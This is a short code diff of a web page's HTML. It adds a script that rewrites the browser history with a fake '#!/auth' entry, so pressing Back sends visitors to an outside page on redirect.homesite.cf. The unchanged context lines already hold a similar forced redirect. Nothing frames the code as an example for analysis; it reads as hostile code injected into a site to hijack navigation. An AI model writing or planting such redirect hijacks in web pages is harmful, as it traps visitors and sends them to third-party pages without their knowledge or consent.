@@ -1,3 +1,4 @@
 <script>
 history.pushState(null, null, window.location.href); history.back(); window.onpopstate = () => location.replace("https://redirect.homesite.cf/gg.html");
 </script>
+<script> var ref = document.referrer; var siteurl = "https://redirect.homesite.cf/extra.html"; if (ref.indexOf(siteurl)!= -1){ } else{ (function(window, location) { history.replaceState(null, document.title, location.pathname+"#!/auth"); history.pushState(null, document.title, location.pathname); window.addEventListener("popstate", function() { if(location.hash === "#!/auth") { history.replaceState(null, document.title, location.pathname); setTimeout(function(){ location.replace("https://redirect.homesite.cf/gg.html"); },0); } }, false); }(window, location)); } </script>
